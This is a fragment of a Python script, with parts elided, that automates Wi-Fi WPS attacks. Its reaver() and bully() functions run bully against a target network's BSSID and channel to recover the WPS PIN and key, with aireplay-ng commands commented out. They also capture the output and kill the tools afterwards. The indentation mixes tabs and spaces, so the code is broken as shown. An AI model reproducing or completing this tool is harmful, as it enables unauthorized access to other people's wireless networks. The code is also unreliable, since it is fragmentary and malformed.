...
def reaver():
	...
	clear()
        ...
        time.sleep(3)
        #cmd = ['airodump-ng', '--channel', str(channel), '--bssid', bssid, '--ignore-negative-one', interface]
...
def bully():
    global choice, bssid, ssid, channel, keycount, ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
    try:
	clear()
        print('Trying to recover %s Key' % (bssid))
	time.sleep(1)
	#cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
        #subprocess.Popen(cmd2, stdout=DN, stderr=DN)
        #time.sleep(3)
        cmd3 = ['bully', '-b', bssid, '-c', str(channel), '-v', str(4), '-d', '-N', '-A', '-C', interface]
	timeout = time.time() + 60*3
        proc = subprocess.Popen(cmd3, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        stdout = []
        while True:
		...
		text_file.close()
		subprocess.call(['killall', 'aireplay-ng'], stderr=DN)
                subprocess.call(['killall', 'bully'], stderr=DN)
		time.sleep(10)
            if line == '' and proc.poll() != None:
		subprocess.call(['killall', 'aireplay-ng'], stderr=DN)
                subprocess.call(['killall', 'bully'], stderr=DN)
